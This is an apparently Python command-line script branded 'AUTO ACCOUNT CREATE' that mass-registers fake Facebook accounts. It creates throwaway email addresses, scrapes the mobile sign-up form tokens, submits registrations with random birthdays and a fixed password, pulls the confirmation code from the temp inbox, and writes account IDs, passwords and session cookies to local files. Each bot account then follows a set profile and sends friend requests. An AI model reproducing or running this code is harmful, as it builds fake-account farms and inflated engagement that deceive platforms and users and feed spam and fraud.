import os
import random, requests, os
y= "\x1b[38;5;208m" #y
B="\033[1;30m" #black
r="\033[1;31m" #red
g="\033[1;32m" #green
ye="\033[1;33m" #ye
bl="\033[38;5;6m" #bl
p="\033[1;35m" #p
c="\033[1;36m" #c
w="\033[1;37m" #w
f= "\033[1;41m" #f
pv= "\033[1;0m" #pv
g = "\x1b[38;5;82m"
g2 = "\x1b[38;5;83m"
g3 = "\x1b[38;5;84m"
g4 = "\x1b[38;5;48m"
g5 = "\x1b[38;5;49m"
r = "\x1b[38;5;202m"
r2 = "\x1b[38;5;203m"
sx = "\x1b[38;5;77m"
gx = "\x1b[38;5;40m"
br = "\x1b[38;5;10m"
yo = "\x1b[38;5;221m"
my_color = [w,bl,g]
warna = random.choice(my_color)
def logo():
    os.system('clear')
    print(f"""
{g}      .dMMMb  dMMMMMP dMMMMMP .aMMMb dMMMMMMP 
{g2}     dMP" VP dMP     dMP     dMP"dMP   dMP    
{g3}     VMMMb  dMMMP   dMMMMP  dMMMMMP   dMP     
{g4}   dP .dMP dMP     dMP     dMP dMP   dMP      
{g5}   VMMMP" dMMMMMP dMP     dMP dMP   dMP       
{yo}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{br}[{r}={br}]{gx} OWNERS {r} ⇋{gx} SEFAT SARKER
{br}[{r}={br}]{gx} FB     {r} ⇋{gx} SEFAT SARKER
{br}[{r}={br}]{gx} GIT HUB{r} ⇋{gx} SEFAT-777
{br}[{r}={br}]{gx} TOOL   {r} ⇋{gx} AUTO ACCOUNT CREATE
{yo}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def linex():
        print(f"{yo}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def main_menu():
    logo()    
    print(f"\x1b[38;5;82m[1] CREATE TEMP MAIL ID WITH FOLLOWER")
    print(f"\x1b[38;5;83m[2] MAIN ADMIN")
    print(f"\x1b[38;5;84m[3] EXIT")
    choice = input(f'\x1b[38;5;85m[•]SELECT : {ye}')
    if choice in ['A', 'a', '01', '1']:
        #os.system('xdg-open https://www.facebook.com/SeFAt.SaRkeR.004')
        tempmail()
    elif choice in ['B', 'b', '02', '2']:
        os.system('xdg-open https://www.facebook.com/SeFAt.SaRkeR.004')
    elif choice in ['C', 'c', '03', '3']:
        exit()
    else:
        print(f'\n[⚠️]{r} CHOOSE VALID OPTION... ');time.sleep(2)
        main_menu()

import requests,re,bs4,os,time,random,datetime
from bs4 import BeautifulSoup as parse
from bs4 import BeautifulSoup as par
from fake_email import Email
sess=requests.Session()

# Example usage
namexd="Sefat+Sarker"
name_2='Sefat Sarker'
password="virus x"

def tempmail():
    logo()
    linex()
    print(f"\x1b[38;5;40m[\033[1;31m+\x1b[38;5;40m] ID CREATE STARTED")
    print(f"\x1b[38;5;40m[\033[1;31m+\x1b[38;5;40m] IF NO RESULT {g}[{r}ON{w}/{r}OFF{g}] {w}\x1b[38;5;40mAIRPLAN MODE")
    linex()
    while True:
        try:
            ua="Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.2(0x18000233) NetType/4G Language/zh_CN"
            #ua = "Mozilla/5.0 (Windows Mozilla/5.0 "+str(random.randrange(4,6))+"; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"
            ses=requests.Session()
            buat=Email().Mail()
            nomer=buat["mail"]
            
    #        nomer=input("nomer acak : ")
    
       #     print(f"\x1b[38;5;84m[{r}+\x1b[38;5;84m]\x1b[38;5;47mMAIL        {r} :{g} "+nomer)
            open('/sdcard/TEAMP_MAIL.txt','a').write(nomer+'|'+password+'\n')
            login=ses.get("https://m.facebook.com/reg")
            lsd=re.search('name="lsd" value="(.*?)"',str(login.text)).group(1)
            jazo=re.search('name="jazoest" value="(.*?)"',str(login.text)).group(1)
            inta=re.search('name="reg_instance" value="(.*?)"',str(login.text)).group(1)
            impres=re.search('name="reg_impression_id" value="(.*?)"',str(login.text)).group(1)
            data=f"lsd={lsd}&jazoest={jazo}&ccp=2&reg_instance={inta}&submission_request=true&helper=&reg_impression_id={impres}&ns=0&zero_header_af_client=&app_id=&logger_id=&field_names[]=firstname&field_names[]=reg_email__&field_names[]=sex&field_names[]=birthday_wrapper&field_names[]=reg_passwd__&firstname={namexd}&reg_email__={nomer}&sex=2&custom_gender=male&did_use_age=false&birthday_day={random.randrange(1,28)}&birthday_month={random.randrange(1,13)}&birthday_year={random.randrange(1970,2000)}&age_step_input=&reg_passwd__={password}&submit=Daftar"
            koki = (";").join([ "%s=%s" % (key, value) for key, value in login.cookies.get_dict().items() ])
            koki+=';m_pixel_ratio=2.625;wd=412x756'
            head={
        "Host": "m.facebook.com",
        "content-length": str(len(data)),
        "cache-control": "max-age=0",
        "viewport-width": "980",
        "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-platform-version": '"9.0.0"',
        "sec-ch-ua-full-version-list": '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',
        "sec-ch-prefers-color-scheme": "light",
        "upgrade-insecure-requests": "1",
        "origin": "https://m.facebook.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": ua,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": "https://m.facebook.com/reg/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"}
            gas=ses.post("https://m.facebook.com/reg/submit/",data=data,headers=head,cookies={"cookie":koki})
            kon=ses.get("https://m.facebook.com")
            if "checkpoint" in str(kon.url):
              #  print(f"\x1b[38;5;84m[•]STATUS      {r} : CHECKPOINT")
              #  linex()
                continue
            else:pass  
            """print(f"\x1b[38;5;84m[•]PASSWORD{r}     :{g} "+password)
           # print(f"\x1b[38;5;84m[•]ACCOUNT NAME{r} :{g} "+name_2)
            print(f"\x1b[38;5;84m[•]STATUS      {g} {r}: {g}ACTIVE")
           # print(f"\x1b[38;5;84m[•]FOLLOW DONE {r} :{g} 100084241091982")"""
            para=parse(kon.text,"html.parser")
            data2={}
            for gg in para("input"):
                if None in {gg.get("name")}:pass
                else:data2.update({gg.get("name"):gg.get("value")})
            link=para.find("form",{"method":"post"}).get("action")
            time.sleep(10)
            while True:
               # print("\r\033[1;37m[\033[1;31m•\033[1;37m] CREATEING ID.....",end="\r")
                mess=Email(buat["session"]).inbox()
                if mess:
                    c=mess['topic'].split(' ')[0].replace("FB-","")
                    data2.update({"c":c})
                    break
            heads={
        "Host": "m.facebook.com",
        "content-length": str(len(str(data2))),
        "cache-control": "max-age=0",
        "viewport-width": "980",
        "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-platform-version": '"9.0.0"',
        "sec-ch-ua-full-version-list": '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',
        "sec-ch-prefers-color-scheme": "light",
        "upgrade-insecure-requests": "1",
        "origin": "https://m.facebook.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": ua,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": kon.url,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"}
            yes=ses.post("https://m.facebook.com"+link,headers=heads,data=data2)
            coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            """print("\x1b[38;5;84m[•]COOKIE       \033[1;31m: \033[38;5;6m"+coki+';m_pixel_ratio=2.625;wd=412x756')"""
            uid = coki.split("c_user=")[1].split(";")[0]
            sexk=f"{coki}m_pixel_ratio=2.625;wd=412x756"
           # print(f"\x1b[38;5;84m[{r}+\x1b[38;5;84m]\x1b[38;5;47mUSER{r}         :{g} "+uid)      
            print(f'\r\r\x1b[38;5;202m[\x1b[38;5;40mSEFAT-OK\x1b[38;5;202m]\x1b[38;5;40m '+uid+' \x1b[38;5;202m• \x1b[38;5;40m'+password+'  \033[1;37m')
            #print(f"\x1b[38;5;84m[{r}+\x1b[38;5;84m]\x1b[38;5;47mPASSWORD{r}     :{g} "+password)
            #print(f"\x1b[38;5;84m[{r}+\x1b[38;5;84m]\x1b[38;5;47mACCOUNT NAME{r} :{g} "+name_2)
           # print(f"\x1b[38;5;84m[{r}+\x1b[38;5;84m]\x1b[38;5;47mSTATUS      {g} {r}: {g}ACTIVE")
           # print(f"\x1b[38;5;84m[{r}+\x1b[38;5;84m]\x1b[38;5;47mFOLLOW DONE {r} :{g} 100084241091982")  
            #print("\x1b[38;5;84m[•]COOKIE       \033[1;31m: \033[38;5;6m"+coki+';m_pixel_ratio=2.625;wd=412x756')
            open("/sdcard/SEFAT.txt", "a").write(f'\n{uid} | {password} | {sexk}')
            login = ses.get("https://m.facebook.com")
            pars=par(login.text,"html.parser")
            for gg in pars.find_all("a",href=True):
                if "Tidak, Terima Kasih" in gg.text:
                    gas=ses.get("https://m.facebook.com"+gg["href"].replace("https://m.facebook.com",""))
                    gass=par(gas.text,"html.parser")
                    link=gass.find("form",{"method":"post"})
                    data={}
                    for lan in gass("input"):
                        data.update({lan.get("name"):lan.get("value")})
                    head={
        "Host": "m.facebook.com",
        "content-length": str(len(str(data))),
        "cache-control": "max-age=0",
        "viewport-width": "980",
        "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-platform-version": '"9.0.0"',
        "sec-ch-ua-full-version-list": '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',
        "sec-ch-prefers-color-scheme": "light",
        "upgrade-insecure-requests": "1",
        "origin": "https://m.facebook.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": ua,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": gas.url,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"}
                    ses.post("https://m.facebook.com"+link.get("action").replace("https://m.facebook.com",""),headers=head,data=data)
            cari=ses.get("https://m.facebook.com")
            lanj=par(cari.text,"html.parser")
            for gg in lanj.find_all("a",href=True):
                if "Selanjutnya"in gg.text:
                    lan=ses.get("https://m.facebook.com"+gg["href"].replace("https://m.facebook.com",""))
                    pas=par(lan.text,"html.parser")
                    for gc in pas.find_all("a",href=True):
                        if "Selanjutnya"in gg.text:
                            la=ses.get("https://m.facebook.com"+gc["href"].replace("https://m.facebook.com",""))
            try:
                fol=["785316773"]
                fl=0
                for user in fol:
                    for response in par(ses.get(f'https://m.facebook.com/'+user).text,'html.parser').find_all('a',href=True):
                        if '/a/subscribe.php?' in response.get('href'):x=ses.get('https://m.facebook.com{}'.format(response['href'])).text;fl+=1
            except:time.sleep(9)
          #  print(f"\x1b[38;5;84m[•]FOLLOW DONE")
            linex()
            kir=par(ses.get("https://www.facebook.com/milah.hujaemah").text,"html.parser")
            kikir=0
            for x in kir.find_all("a",href=True):
                try:
                    if "/a/friends" in str(x["href"]):
                        ses.get("https://m.facebook.com"+x["href"])
                        kikir+=1
                except:time.sleep(10)
        except requests.exceptions.ConnectionError:time.sleep(31)
        except Exception as e:
            if 'permalink' in str(e):
                continue
            else:
                print(f"{r}NETWORK ERROR")
                linex()
            

main_menu()